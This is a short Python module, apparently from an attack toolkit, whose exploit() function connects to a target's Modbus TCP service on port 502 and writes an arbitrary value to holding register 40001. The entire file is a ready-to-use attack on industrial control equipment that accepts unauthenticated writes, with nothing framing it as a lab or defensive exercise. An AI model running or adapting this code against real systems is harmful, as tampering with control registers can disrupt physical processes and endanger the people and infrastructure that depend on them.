from pymodbus.client import ModbusTcpClient
from utils.logger import setup_logger

logger = setup_logger()

def exploit(target, port=502):
    client = ModbusTcpClient(target, port=port)
    if not client.connect():
        logger.error("Could not connect to Modbus server")
        return False
    try:
        # Write value 12345 to register 40001 (example)
        rr = client.write_register(40001, 12345)
        if rr.isError():
            logger.error("Failed to write register")
            return False
        logger.info("Successfully wrote to Modbus register")
        return True
    except Exception as e:
        logger.error(f"Modbus exploit error: {e}")
        return False
    finally:
        client.close()